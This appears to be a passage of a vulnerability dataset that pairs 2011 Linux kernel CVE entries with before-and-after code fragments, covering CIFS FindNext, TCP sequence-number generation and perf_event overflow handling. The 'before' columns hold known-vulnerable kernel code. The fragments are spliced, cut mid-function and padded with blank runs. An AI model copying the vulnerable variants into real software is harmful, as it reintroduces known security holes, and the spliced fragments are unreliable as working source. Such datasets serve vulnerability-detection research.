 union cpu_time_count cpu,
 struct timespec *tp)
{
 if (CPUCLOCK_WHICH(which_clock) == CPUCLOCK_SCHED)
		*tp = ns_to_timespec(cpu.sched);
 else

 cputime_to_timespec(cpu.cpu, tp);

}

static inline int cpu_time_before(const clockid_t which_clock,
struct timespec ns_to_timespec(const s64 nsec)
{
 struct timespec ts;
	s32 rem;

 if (!nsec)
 return (struct timespec) {0, 0};

	ts.tv_sec = div_s64_rem(nsec, NSEC_PER_SEC, &rem);
 if (unlikely(rem < 0)) {
		ts.tv_sec--;
		rem += NSEC_PER_SEC;
	}
	ts.tv_nsec = rem;

 return ts;
}
	 * Convert jiffies to nanoseconds and separate with
	 * one divide.
 */
	u32 rem;
	value->tv_sec = div_u64_rem((u64)jiffies * TICK_NSEC,
				    NSEC_PER_SEC, &rem);
	value->tv_nsec = rem;
}
EXPORT_SYMBOL(jiffies_to_timespec);

	 * Convert jiffies to nanoseconds and separate with
	 * one divide.
 */
	u32 rem;


	value->tv_sec = div_u64_rem((u64)jiffies * TICK_NSEC,
 			    NSEC_PER_SEC, &rem);
	value->tv_usec = rem / NSEC_PER_USEC;
}
EXPORT_SYMBOL(jiffies_to_timeval);

 */
int do_adjtimex(struct timex *txc)
{
 long mtemp, save_adjust;
	s64 freq_adj;
 int result;

		    freq_adj += time_freq;
		    freq_adj = min(freq_adj, (s64)MAXFREQ_NSEC);
		    time_freq = max(freq_adj, (s64)-MAXFREQ_NSEC);
		    time_offset = div_s64(time_offset, NTP_INTERVAL_FREQ);


		    time_offset <<= SHIFT_UPDATE;
		} /* STA_PLL */
	    } /* txc->modes & ADJ_OFFSET */
#include <linux/debugobjects.h>
#include <linux/kallsyms.h>
#include <linux/memory.h>
#include <linux/math64.h>

/*
 * Lock order:
			len += sprintf(buf + len, ""<not-available>"");

 if (l->sum_time != l->min_time) {


			len += sprintf(buf + len, "" age=%ld/%ld/%ld"",
  l->min_time,
 	(long)div_u64(l->sum_time, l->count),
  l->max_time);
		} else
			len += sprintf(buf + len, "" age=%ld"",
				l->min_time);
"
2012,DoS Overflow Mem. Corr. ,CVE-2011-3191,"	T2_FNEXT_RSP_PARMS *parms;
 char *response_data;
 int rc = 0;
 int bytes_returned, name_len;

	__u16 params, byte_count;

 cFYI(1, ""In FindNext"");
","	T2_FNEXT_RSP_PARMS *parms;
 char *response_data;
 int rc = 0;
 int bytes_returned;
 unsigned int name_len;
	__u16 params, byte_count;

 cFYI(1, ""In FindNext"");
"
2012,DoS ,CVE-2011-3188,"};
#endif /* CONFIG_SYSCTL */

/********************************************************************
 *
 * Random functions for networking
 *
 ********************************************************************/

/*
 * TCP initial sequence number picking.  This uses the random number
 * generator to pick an initial secret value.  This value is hashed
 * along with the TCP endpoint information to provide a unique
 * starting point for each pair of TCP endpoints.  This defeats
 * attacks which rely on guessing the initial TCP sequence number.
 * This algorithm was suggested by Steve Bellovin.
 *
 * Using a very strong hash was taking an appreciable amount of the total
 * TCP connection establishment time, so this is a weaker hash,
 * compensated for by changing the secret periodically.
 */

/* F, G and H are basic MD4 functions: selection, majority, parity */
#define F(x, y, z) ((z) ^ ((x) & ((y) ^ (z))))
#define G(x, y, z) (((x) & (y)) + (((x) ^ (y)) & (z)))
#define H(x, y, z) ((x) ^ (y) ^ (z))

/*
 * The generic round function.  The application is so specific that
 * we don't bother protecting all the arguments with parens, as is generally
 * good macro practice, in favor of extra legibility.
 * Rotation is separate from addition to prevent recomputation
 */
#define ROUND(f, a, b, c, d, x, s)	\
	(a += f(b, c, d) + x, a = (a << s) | (a >> (32 - s)))
#define K1 0
#define K2 013240474631UL
#define K3 015666365641UL

#if defined(CONFIG_IPV6) || defined(CONFIG_IPV6_MODULE)

static __u32 twothirdsMD4Transform(__u32 const buf[4], __u32 const in[12])
{
	__u32 a = buf[0], b = buf[1], c = buf[2], d = buf[3];

 /* Round 1 */
 ROUND(F, a, b, c, d, in[ 0] + K1,  3);
 ROUND(F, d, a, b, c, in[ 1] + K1,  7);
 ROUND(F, c, d, a, b, in[ 2] + K1, 11);
 ROUND(F, b, c, d, a, in[ 3] + K1, 19);
 ROUND(F, a, b, c, d, in[ 4] + K1,  3);
 ROUND(F, d, a, b, c, in[ 5] + K1,  7);
 ROUND(F, c, d, a, b, in[ 6] + K1, 11);
 ROUND(F, b, c, d, a, in[ 7] + K1, 19);
 ROUND(F, a, b, c, d, in[ 8] + K1,  3);
 ROUND(F, d, a, b, c, in[ 9] + K1,  7);
 ROUND(F, c, d, a, b, in[10] + K1, 11);
 ROUND(F, b, c, d, a, in[11] + K1, 19);

 /* Round 2 */
 ROUND(G, a, b, c, d, in[ 1] + K2,  3);
 ROUND(G, d, a, b, c, in[ 3] + K2,  5);
 ROUND(G, c, d, a, b, in[ 5] + K2,  9);
 ROUND(G, b, c, d, a, in[ 7] + K2, 13);
 ROUND(G, a, b, c, d, in[ 9] + K2,  3);
 ROUND(G, d, a, b, c, in[11] + K2,  5);
 ROUND(G, c, d, a, b, in[ 0] + K2,  9);
 ROUND(G, b, c, d, a, in[ 2] + K2, 13);
 ROUND(G, a, b, c, d, in[ 4] + K2,  3);
 ROUND(G, d, a, b, c, in[ 6] + K2,  5);
 ROUND(G, c, d, a, b, in[ 8] + K2,  9);
 ROUND(G, b, c, d, a, in[10] + K2, 13);

 /* Round 3 */
 ROUND(H, a, b, c, d, in[ 3] + K3,  3);
 ROUND(H, d, a, b, c, in[ 7] + K3,  9);
 ROUND(H, c, d, a, b, in[11] + K3, 11);
 ROUND(H, b, c, d, a, in[ 2] + K3, 15);
 ROUND(H, a, b, c, d, in[ 6] + K3,  3);
 ROUND(H, d, a, b, c, in[10] + K3,  9);
 ROUND(H, c, d, a, b, in[ 1] + K3, 11);
 ROUND(H, b, c, d, a, in[ 5] + K3, 15);
 ROUND(H, a, b, c, d, in[ 9] + K3,  3);
 ROUND(H, d, a, b, c, in[ 0] + K3,  9);
 ROUND(H, c, d, a, b, in[ 4] + K3, 11);
 ROUND(H, b, c, d, a, in[ 8] + K3, 15);

 return buf[1] + b; /* ""most hashed"" word */
 /* Alternative: return sum of all words? */
}
#endif

#undef ROUND
#undef F
#undef G
#undef H
#undef K1
#undef K2
#undef K3

/* This should not be decreased so low that ISNs wrap too fast. */
#define REKEY_INTERVAL (300 * HZ)
/*
 * Bit layout of the tcp sequence numbers (before adding current time):
 * bit 24-31: increased after every key exchange
 * bit 0-23: hash(source,dest)
 *
 * The implementation is similar to the algorithm described
 * in the Appendix of RFC 1185, except that
 * - it uses a 1 MHz clock instead of a 250 kHz clock
 * - it performs a rekey every 5 minutes, which is equivalent
 * 	to a (source,dest) tulple dependent forward jump of the
 * 	clock by 0..2^(HASH_BITS+1)
 *
 * Thus the average ISN wraparound time is 68 minutes instead of
 * 4.55 hours.
 *
 * SMP cleanup and lock avoidance with poor man's RCU.
 * 			Manfred Spraul <manfred@colorfullife.com>
 *
 */
#define COUNT_BITS 8
#define COUNT_MASK ((1 << COUNT_BITS) - 1)
#define HASH_BITS 24
#define HASH_MASK ((1 << HASH_BITS) - 1)

static struct keydata {
	__u32 count; /* already shifted to the final position */
	__u32 secret[12];
} ____cacheline_aligned ip_keydata[2];

static unsigned int ip_cnt;

static void rekey_seq_generator(struct work_struct *work);

static DECLARE_DELAYED_WORK(rekey_work, rekey_seq_generator);

/*
 * Lock avoidance:
 * The ISN generation runs lockless - it's just a hash over random data.
 * State changes happen every 5 minutes when the random key is replaced.
 * Synchronization is performed by having two copies of the hash function
 * state and rekey_seq_generator always updates the inactive copy.
 * The copy is then activated by updating ip_cnt.
 * The implementation breaks down if someone blocks the thread
 * that processes SYN requests for more than 5 minutes. Should never
 * happen, and even if that happens only a not perfectly compliant
 * ISN is generated, nothing fatal.
 */
static void rekey_seq_generator(struct work_struct *work)
{
 struct keydata *keyptr = &ip_keydata[1 ^ (ip_cnt & 1)];

 get_random_bytes(keyptr->secret, sizeof(keyptr->secret));
	keyptr->count = (ip_cnt & COUNT_MASK) << HASH_BITS;
 smp_wmb();
	ip_cnt++;
 schedule_delayed_work(&rekey_work,
 round_jiffies_relative(REKEY_INTERVAL));
}

static inline struct keydata *get_keyptr(void)
{
 struct keydata *keyptr = &ip_keydata[ip_cnt & 1];

 smp_rmb();

 return keyptr;
}

static __init int seqgen_init(void)
{
 rekey_seq_generator(NULL);
 return 0;
}
late_initcall(seqgen_init);

#if defined(CONFIG_IPV6) || defined(CONFIG_IPV6_MODULE)
__u32 secure_tcpv6_sequence_number(__be32 *saddr, __be32 *daddr,
				   __be16 sport, __be16 dport)
{
	__u32 seq;
	__u32 hash[12];
 struct keydata *keyptr = get_keyptr();

 /* The procedure is the same as for IPv4, but addresses are longer.
	 * Thus we must use twothirdsMD4Transform.
 */

 memcpy(hash, saddr, 16);
	hash[4] = ((__force u16)sport << 16) + (__force u16)dport;
 memcpy(&hash[5], keyptr->secret, sizeof(__u32) * 7);

	seq = twothirdsMD4Transform((const __u32 *)daddr, hash) & HASH_MASK;
	seq += keyptr->count;

	seq += ktime_to_ns(ktime_get_real());

 return seq;
}
EXPORT_SYMBOL(secure_tcpv6_sequence_number);
#endif

/*  The code below is shamelessly stolen from secure_tcp_sequence_number().
 *  All blames to Andrey V. Savochkin <saw@msu.ru>.
 */
__u32 secure_ip_id(__be32 daddr)
{
 struct keydata *keyptr;
	__u32 hash[4];

	keyptr = get_keyptr();

 /*
	 *  Pick a unique starting offset for each IP destination.
	 *  The dest ip address is placed in the starting vector,
	 *  which is then hashed with random data.
 */
	hash[0] = (__force __u32)daddr;
	hash[1] = keyptr->secret[9];
	hash[2] = keyptr->secret[10];
	hash[3] = keyptr->secret[11];

 return half_md4_transform(hash, keyptr->secret);
}

__u32 secure_ipv6_id(const __be32 daddr[4])
{
 const struct keydata *keyptr;
	__u32 hash[4];

	keyptr = get_keyptr();

	hash[0] = (__force __u32)daddr[0];
	hash[1] = (__force __u32)daddr[1];
	hash[2] = (__force __u32)daddr[2];
	hash[3] = (__force __u32)daddr[3];

 return half_md4_transform(hash, keyptr->secret);
}

#ifdef CONFIG_INET

__u32 secure_tcp_sequence_number(__be32 saddr, __be32 daddr,
				 __be16 sport, __be16 dport)
{
	__u32 seq;
	__u32 hash[4];
 struct keydata *keyptr = get_keyptr();

 /*
	 *  Pick a unique starting offset for each TCP connection endpoints
	 *  (saddr, daddr, sport, dport).
	 *  Note that the words are placed into the starting vector, which is
	 *  then mixed with a partial MD4 over random data.
 */
	hash[0] = (__force u32)saddr;
	hash[1] = (__force u32)daddr;
	hash[2] = ((__force u16)sport << 16) + (__force u16)dport;
	hash[3] = keyptr->secret[11];

	seq = half_md4_transform(hash, keyptr->secret) & HASH_MASK;
	seq += keyptr->count;
 /*
	 *	As close as possible to RFC 793, which
	 *	suggests using a 250 kHz clock.
	 *	Further reading shows this assumes 2 Mb/s networks.
	 *	For 10 Mb/s Ethernet, a 1 MHz clock is appropriate.
	 *	For 10 Gb/s Ethernet, a 1 GHz clock should be ok, but
	 *	we also need to limit the resolution so that the u32 seq
	 *	overlaps less than one time per MSL (2 minutes).
	 *	Choosing a clock of 64 ns period is OK. (period of 274 s)
 */
	seq += ktime_to_ns(ktime_get_real()) >> 6;

 return seq;
}

/* Generate secure starting point for ephemeral IPV4 transport port search */
u32 secure_ipv4_port_ephemeral(__be32 saddr, __be32 daddr, __be16 dport)
{
 struct keydata *keyptr = get_keyptr();
	u32 hash[4];

 /*
	 *  Pick a unique starting offset for each ephemeral port search
	 *  (saddr, daddr, dport) and 48bits of random data.
 */
	hash[0] = (__force u32)saddr;
	hash[1] = (__force u32)daddr;
	hash[2] = (__force u32)dport ^ keyptr->secret[10];
	hash[3] = keyptr->secret[11];

 return half_md4_transform(hash, keyptr->secret);
}
EXPORT_SYMBOL_GPL(secure_ipv4_port_ephemeral);

#if defined(CONFIG_IPV6) || defined(CONFIG_IPV6_MODULE)
u32 secure_ipv6_port_ephemeral(const __be32 *saddr, const __be32 *daddr,
			       __be16 dport)
{
 struct keydata *keyptr = get_keyptr();
	u32 hash[12];

 memcpy(hash, saddr, 16);
	hash[4] = (__force u32)dport;
 memcpy(&hash[5], keyptr->secret, sizeof(__u32) * 7);

 return twothirdsMD4Transform((const __u32 *)daddr, hash);
}
#endif

#if defined(CONFIG_IP_DCCP) || defined(CONFIG_IP_DCCP_MODULE)
/* Similar to secure_tcp_sequence_number but generate a 48 bit value
 * bit's 32-47 increase every key exchange
 *       0-31  hash(source, dest)
 */
u64 secure_dccp_sequence_number(__be32 saddr, __be32 daddr,
				__be16 sport, __be16 dport)
{
	u64 seq;
	__u32 hash[4];
 struct keydata *keyptr = get_keyptr();

	hash[0] = (__force u32)saddr;
	hash[1] = (__force u32)daddr;
	hash[2] = ((__force u16)sport << 16) + (__force u16)dport;
	hash[3] = keyptr->secret[11];

	seq = half_md4_transform(hash, keyptr->secret);
	seq |= ((u64)keyptr->count) << (32 - HASH_BITS);

	seq += ktime_to_ns(ktime_get_real());
	seq &= (1ull << 48) - 1;

 return seq;
}
EXPORT_SYMBOL(secure_dccp_sequence_number);
#endif

#endif /* CONFIG_INET */


/*
 * Get a random word for internal kernel use only. Similar to urandom but
 * with the goal of minimal entropy pool depletion. As a result, the random
 * value is not cryptographically secure but for several uses the cost of
 * depleting entropy is too high
 */
DEFINE_PER_CPU(__u32 [4], get_random_int_hash);
unsigned int get_random_int(void)
{
 struct keydata *keyptr;
	__u32 *hash = get_cpu_var(get_random_int_hash);
 int ret;

	keyptr = get_keyptr();
	hash[0] += current->pid + jiffies + get_cycles();

	ret = half_md4_transform(hash, keyptr->secret);
 put_cpu_var(get_random_int_hash);

 return ret;
extern void get_random_bytes(void *buf, int nbytes);
void generate_random_uuid(unsigned char uuid_out[16]);

extern __u32 secure_ip_id(__be32 daddr);
extern __u32 secure_ipv6_id(const __be32 daddr[4]);
extern u32 secure_ipv4_port_ephemeral(__be32 saddr, __be32 daddr, __be16 dport);
extern u32 secure_ipv6_port_ephemeral(const __be32 *saddr, const __be32 *daddr,
				      __be16 dport);
extern __u32 secure_tcp_sequence_number(__be32 saddr, __be32 daddr,
					__be16 sport, __be16 dport);
extern __u32 secure_tcpv6_sequence_number(__be32 *saddr, __be32 *daddr,
					  __be16 sport, __be16 dport);
extern u64 secure_dccp_sequence_number(__be32 saddr, __be32 daddr,
				       __be16 sport, __be16 dport);

#ifndef MODULE
extern const struct file_operations random_fops, urandom_fops;
#endif
","};
#endif /* CONFIG_SYSCTL */

static u32 random_int_secret[MD5_MESSAGE_BYTES / 4] ____cacheline_aligned;


























































































































static int __init random_int_secret_init(void)























{
 get_random_bytes(random_int_secret, sizeof(random_int_secret));





















 return 0;
}
late_initcall(random_int_secret_init);







































































































































































/*
 * Get a random word for internal kernel use only. Similar to urandom but
 * with the goal of minimal entropy pool depletion. As a result, the random
 * value is not cryptographically secure but for several uses the cost of
 * depleting entropy is too high
 */
DEFINE_PER_CPU(__u32 [MD5_DIGEST_WORDS], get_random_int_hash);
unsigned int get_random_int(void)
{

	__u32 *hash = get_cpu_var(get_random_int_hash);
 unsigned int ret;


	hash[0] += current->pid + jiffies + get_cycles();
 md5_transform(hash, random_int_secret);
	ret = hash[0];
 put_cpu_var(get_random_int_hash);

 return ret;
extern void get_random_bytes(void *buf, int nbytes);
void generate_random_uuid(unsigned char uuid_out[16]);













#ifndef MODULE
extern const struct file_operations random_fops, urandom_fops;
#endif
"
2013,DoS ,CVE-2011-2942,,
2011,DoS ,CVE-2011-2928,,
2012,DoS Overflow ,CVE-2011-2918,"	data.period = event->hw.last_period;

 if (alpha_perf_event_set_period(event, hwc, idx)) {
 if (perf_event_overflow(event, 1, &data, regs)) {
 /* Interrupts coming too quickly; ""throttle"" the
			 * counter, i.e., disable it for a little while.
 */
 if (!armpmu_event_set_period(event, hwc, idx))
 continue;

 if (perf_event_overflow(event, 0, &data, regs))
			armpmu->disable(hwc, idx);
	}

 if (!armpmu_event_set_period(event, hwc, idx))
 continue;

 if (perf_event_overflow(event, 0, &data, regs))
			armpmu->disable(hwc, idx);
	}

 if (!armpmu_event_set_period(event, hwc, idx))
 continue;

 if (perf_event_overflow(event, 0, &data, regs))
			armpmu->disable(hwc, idx);
	}

 if (!armpmu_event_set_period(event, hwc, idx))
 continue;

 if (perf_event_overflow(event, 0, &data, regs))
			armpmu->disable(hwc, idx);
	}

/*
 * Handle hitting a HW-breakpoint.
 */
static void ptrace_hbptriggered(struct perf_event *bp, int unused,
 struct perf_sample_data *data,
 struct pt_regs *regs)
{
 unsigned int address, destreg, data, type;
 unsigned int res = 0;

 perf_sw_event(PERF_COUNT_SW_EMULATION_FAULTS, 1, 0, regs, regs->ARM_pc);

 if (current->pid != previous_pid) {
 pr_debug(""\""%s\"" (%ld) uses deprecated SWP{B} instruction\n"",
	fault = __do_page_fault(mm, addr, fsr, tsk);
 up_read(&mm->mmap_sem);

 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS, 1, 0, regs, addr);
 if (fault & VM_FAULT_MAJOR)
 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MAJ, 1, 0, regs, addr);
 else if (fault & VM_FAULT_MINOR)
 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MIN, 1, 0, regs, addr);

 /*
	 * Handle the ""normal"" case first - VM_FAULT_MAJOR / VM_FAULT_MINOR
 if (!mipspmu_event_set_period(event, hwc, idx))
 return;

 if (perf_event_overflow(event, 0, data, regs))
		mipspmu->disable_event(idx);
}

{
 if ((opcode & OPCODE) == LL) {
 perf_sw_event(PERF_COUNT_SW_EMULATION_FAULTS,
 1, 0, regs, 0);
 return simulate_ll(regs, opcode);
	}
 if ((opcode & OPCODE) == SC) {
 perf_sw_event(PERF_COUNT_SW_EMULATION_FAULTS,
 1, 0, regs, 0);
 return simulate_sc(regs, opcode);
	}

 int rd = (opcode & RD) >> 11;
 int rt = (opcode & RT) >> 16;
 perf_sw_event(PERF_COUNT_SW_EMULATION_FAULTS,
 1, 0, regs, 0);
 switch (rd) {
 case 0:		/* CPU number */
			regs->regs[rt] = smp_processor_id();
{
 if ((opcode & OPCODE) == SPEC0 && (opcode & FUNC) == SYNC) {
 perf_sw_event(PERF_COUNT_SW_EMULATION_FAULTS,
 1, 0, regs, 0);
 return 0;
	}

 unsigned long value;
 unsigned int res;

 perf_sw_event(PERF_COUNT_SW_EMULATION_FAULTS,
 1, 0, regs, 0);

 /*
	 * This load never faults.
 mm_segment_t seg;

 perf_sw_event(PERF_COUNT_SW_ALIGNMENT_FAULTS,
 1, 0, regs, regs->cp0_badvaddr);
 /*
	 * Did we catch a fault trying to load an instruction?
	 * Or are we running in MIPS16 mode?
	}

      emul:
 perf_sw_event(PERF_COUNT_SW_EMULATION_FAULTS,
 1, 0, xcp, 0);
 MIPS_FPU_EMU_INC_STATS(emulated);
 switch (MIPSInst_OPCODE(ir)) {
 case ldc1_op:{
	 * the fault.
 */
	fault = handle_mm_fault(mm, vma, address, write ? FAULT_FLAG_WRITE : 0);
 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS, 1, 0, regs, address);
 if (unlikely(fault & VM_FAULT_ERROR)) {
 if (fault & VM_FAULT_OOM)
 goto out_of_memory;
 BUG();
	}
 if (fault & VM_FAULT_MAJOR) {
 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MAJ,
 1, 0, regs, address);
		tsk->maj_flt++;
	} else {
 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MIN,
 1, 0, regs, address);
		tsk->min_flt++;
	}

#define PPC_WARN_EMULATED(type, regs)					\
 do {								\
 perf_sw_event(PERF_COUNT_SW_EMULATION_FAULTS,		\
 1, 0, regs, 0);					\
 __PPC_WARN_EMULATED(type);				\
	} while (0)

#define PPC_WARN_ALIGNMENT(type, regs)					\
 do {								\
 perf_sw_event(PERF_COUNT_SW_ALIGNMENT_FAULTS,		\
 1, 0, regs, regs->dar);				\
 __PPC_WARN_EMULATED(type);				\
	} while (0)

 * here so there is no possibility of being interrupted.
 */
static void record_and_restart(struct perf_event *event, unsigned long val,
 struct pt_regs *regs, int nmi)
{
	u64 period = event->hw.sample_period;
	s64 prev, delta, left;
 if (event->attr.sample_type & PERF_SAMPLE_ADDR)
 perf_get_data_addr(regs, &data.addr);

 if (perf_event_overflow(event, nmi, &data, regs))
 power_pmu_stop(event, 0);
	}
}
 if ((int)val < 0) {
 /* event has overflowed */
			found = 1;
 record_and_restart(event, val, regs, nmi);
		}
	}

 * here so there is no possibility of being interrupted.
 */
static void record_and_restart(struct perf_event *event, unsigned long val,
 struct pt_regs *regs, int nmi)
{
	u64 period = event->hw.sample_period;
	s64 prev, delta, left;
 perf_sample_data_init(&data, 0);
		data.period = event->hw.last_period;

 if (perf_event_overflow(event, nmi, &data, regs))
 fsl_emb_pmu_stop(event, 0);
	}
}
 if (event) {
 /* event has overflowed */
				found = 1;
 record_and_restart(event, val, regs, nmi);
			} else {
 /*
				 * Disabled counter is negative,
}

#ifdef CONFIG_HAVE_HW_BREAKPOINT
void ptrace_triggered(struct perf_event *bp, int nmi,
 struct perf_sample_data *data, struct pt_regs *regs)
{
 struct perf_event_attr attr;
 die(""Weird page fault"", regs, SIGSEGV);
	}

 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS, 1, 0, regs, address);

 /* When running in the kernel we expect faults to occur only to
	 * addresses in user space.  All other faults represent errors in the
	}
 if (ret & VM_FAULT_MAJOR) {
		current->maj_flt++;
 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MAJ, 1, 0,
				     regs, address);
#ifdef CONFIG_PPC_SMLPAR
 if (firmware_has_feature(FW_FEATURE_CMO)) {
#endif
	} else {
		current->min_flt++;
 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MIN, 1, 0,
				     regs, address);
	}
 up_read(&mm->mmap_sem);
 goto out;

	address = trans_exc_code & __FAIL_ADDR_MASK;
 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS, 1, 0, regs, address);
	flags = FAULT_FLAG_ALLOW_RETRY;
 if (access == VM_WRITE || (trans_exc_code & store_indication) == 0x400)
		flags |= FAULT_FLAG_WRITE;
 if (flags & FAULT_FLAG_ALLOW_RETRY) {
 if (fault & VM_FAULT_MAJOR) {
			tsk->maj_flt++;
 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MAJ, 1, 0,
				      regs, address);
		} else {
			tsk->min_flt++;
 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MIN, 1, 0,
				      regs, address);
		}
 if (fault & VM_FAULT_RETRY) {
 return 0;
}

void ptrace_triggered(struct perf_event *bp, int nmi,
 struct perf_sample_data *data, struct pt_regs *regs)
{
 struct perf_event_attr attr;
 */
 if (!expected) {
 unaligned_fixups_notify(current, instruction, regs);
 perf_sw_event(PERF_COUNT_SW_ALIGNMENT_FAULTS, 1, 0,
			      regs, address);
	}

 return error;
	}

 perf_sw_event(PERF_COUNT_SW_ALIGNMENT_FAULTS, 1, 0, regs, address);

	destreg = (opcode >> 4) & 0x3f;
 if (user_mode(regs)) {
 return error;
	}

 perf_sw_event(PERF_COUNT_SW_ALIGNMENT_FAULTS, 1, 0, regs, address);

	srcreg = (opcode >> 4) & 0x3f;
 if (user_mode(regs)) {
 return error;
	}

 perf_sw_event(PERF_COUNT_SW_EMULATION_FAULTS, 1, 0, regs, address);

	destreg = (opcode >> 4) & 0x3f;
 if (user_mode(regs)) {
 return error;
	}

 perf_sw_event(PERF_COUNT_SW_EMULATION_FAULTS, 1, 0, regs, address);

	srcreg = (opcode >> 4) & 0x3f;
 if (user_mode(regs)) {
 struct task_struct *tsk = current;
 struct sh_fpu_soft_struct *fpu = &(tsk->thread.xstate->softfpu);

 perf_sw_event(PERF_COUNT_SW_EMULATION_FAULTS, 1, 0, regs, 0);

 if (!(task_thread_info(tsk)->status & TS_USEDFPU)) {
 /* initialize once. */
 if ((regs->sr & SR_IMASK) != SR_IMASK)
 local_irq_enable();

 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS, 1, 0, regs, address);

 /*
	 * If we're in an interrupt, have no user context or are running
	}
 if (fault & VM_FAULT_MAJOR) {
		tsk->maj_flt++;
 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MAJ, 1, 0,
				     regs, address);
	} else {
		tsk->min_flt++;
 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MIN, 1, 0,
				     regs, address);
	}

","	data.period = event->hw.last_period;

 if (alpha_perf_event_set_period(event, hwc, idx)) {
 if (perf_event_overflow(event, &data, regs)) {
 /* Interrupts coming too quickly; ""throttle"" the
			 * counter, i.e., disable it for a little while.
 */
 if (!armpmu_event_set_period(event, hwc, idx))
 continue;

 if (perf_event_overflow(event, &data, regs))
			armpmu->disable(hwc, idx);
	}

 if (!armpmu_event_set_period(event, hwc, idx))
 continue;

 if (perf_event_overflow(event, &data, regs))
			armpmu->disable(hwc, idx);
	}

 if (!armpmu_event_set_period(event, hwc, idx))
 continue;

 if (perf_event_overflow(event, &data, regs))
			armpmu->disable(hwc, idx);
	}

 if (!armpmu_event_set_period(event, hwc, idx))
 continue;

 if (perf_event_overflow(event, &data, regs))
			armpmu->disable(hwc, idx);
	}

/*
 * Handle hitting a HW-breakpoint.
 */
static void ptrace_hbptriggered(struct perf_event *bp,
 struct perf_sample_data *data,
 struct pt_regs *regs)
{
 unsigned int address, destreg, data, type;
 unsigned int res = 0;

 perf_sw_event(PERF_COUNT_SW_EMULATION_FAULTS, 1, regs, regs->ARM_pc);

 if (current->pid != previous_pid) {
 pr_debug(""\""%s\"" (%ld) uses deprecated SWP{B} instruction\n"",
	fault = __do_page_fault(mm, addr, fsr, tsk);
 up_read(&mm->mmap_sem);

 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS, 1, regs, addr);
 if (fault & VM_FAULT_MAJOR)
 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MAJ, 1, regs, addr);
 else if (fault & VM_FAULT_MINOR)
 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MIN, 1, regs, addr);

 /*
	 * Handle the ""normal"" case first - VM_FAULT_MAJOR / VM_FAULT_MINOR
 if (!mipspmu_event_set_period(event, hwc, idx))
 return;

 if (perf_event_overflow(event, data, regs))
		mipspmu->disable_event(idx);
}

{
 if ((opcode & OPCODE) == LL) {
 perf_sw_event(PERF_COUNT_SW_EMULATION_FAULTS,
 1, regs, 0);
 return simulate_ll(regs, opcode);
	}
 if ((opcode & OPCODE) == SC) {
 perf_sw_event(PERF_COUNT_SW_EMULATION_FAULTS,
 1, regs, 0);
 return simulate_sc(regs, opcode);
	}

 int rd = (opcode & RD) >> 11;
 int rt = (opcode & RT) >> 16;
 perf_sw_event(PERF_COUNT_SW_EMULATION_FAULTS,
 1, regs, 0);
 switch (rd) {
 case 0:		/* CPU number */
			regs->regs[rt] = smp_processor_id();
{
 if ((opcode & OPCODE) == SPEC0 && (opcode & FUNC) == SYNC) {
 perf_sw_event(PERF_COUNT_SW_EMULATION_FAULTS,
 1, regs, 0);
 return 0;
	}

 unsigned long value;
 unsigned int res;

 perf_sw_event(PERF_COUNT_SW_EMULATION_FAULTS, 1, regs, 0);


 /*
	 * This load never faults.
 mm_segment_t seg;

 perf_sw_event(PERF_COUNT_SW_ALIGNMENT_FAULTS,
 1, regs, regs->cp0_badvaddr);
 /*
	 * Did we catch a fault trying to load an instruction?
	 * Or are we running in MIPS16 mode?
	}

      emul:
 perf_sw_event(PERF_COUNT_SW_EMULATION_FAULTS, 1, xcp, 0);

 MIPS_FPU_EMU_INC_STATS(emulated);
 switch (MIPSInst_OPCODE(ir)) {
 case ldc1_op:{
	 * the fault.
 */
	fault = handle_mm_fault(mm, vma, address, write ? FAULT_FLAG_WRITE : 0);
 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS, 1, regs, address);
 if (unlikely(fault & VM_FAULT_ERROR)) {
 if (fault & VM_FAULT_OOM)
 goto out_of_memory;
 BUG();
	}
 if (fault & VM_FAULT_MAJOR) {
 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MAJ, 1, regs, address);

		tsk->maj_flt++;
	} else {
 perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MIN, 1, regs, address);

		tsk->min_flt++;
	}

#define PPC_WARN_EMULATED(type, regs)					\
 do {								\
 perf_sw_event(PERF_COUNT_SW_EMULATION_FAULTS,		\
 1, regs, 0);					\
 __PPC_WARN_EMULATED(type);				\
	} while (0)

#define PPC_WARN_ALIGNMENT(type, regs)					\
 do {								\
 perf_sw_event(PERF_COUNT_SW_ALIGNMENT_FAULTS,		\
 1, regs, regs->dar);				\
 __PPC_WARN_EMULATED(type);				\
	} while (0)

 * here so there is no possibility of being interrupted.
 */
static void record_and_restart(struct perf_event *event, unsigned long val,
 struct pt_regs *regs)
{
	u64 period = event->hw.sample_period;
	s64 prev, delta, left;
 if (event->attr.sample_type & PERF_SAMPLE_ADDR)
 perf_get_data_addr(regs, &data.addr);

 if (perf_event_overflow(event, &data, regs))
 power_pmu_stop(event, 0);
	}
}
 if ((int)val < 0) {
 /* event has overflowed */
			found = 1;
 record_and_restart(event, val, regs);
		}
	}

 * here so there is no possibility of being interrupted.
 */
static void record_and_restart(struct perf_event *event, unsigned long val,
 struct pt_regs *regs)
{
	u64 period = event->hw.sample_period;
	s64 prev, delta, left;
 perf_sample_data_init(&data, 0);
		data.period = event->hw.last_period;

 if (perf_event_overflow(event, &data, regs))
 fsl_emb_pmu_stop(event, 0);
	}
}
 if (event) {
 /* event has overflowed */
				found = 1;
 record_and_restart(event, val, regs);
			} else {
 /*
				 * Disabled counter is negative,
}

#ifdef CONFIG_HAVE_HW_BREAKPOINT
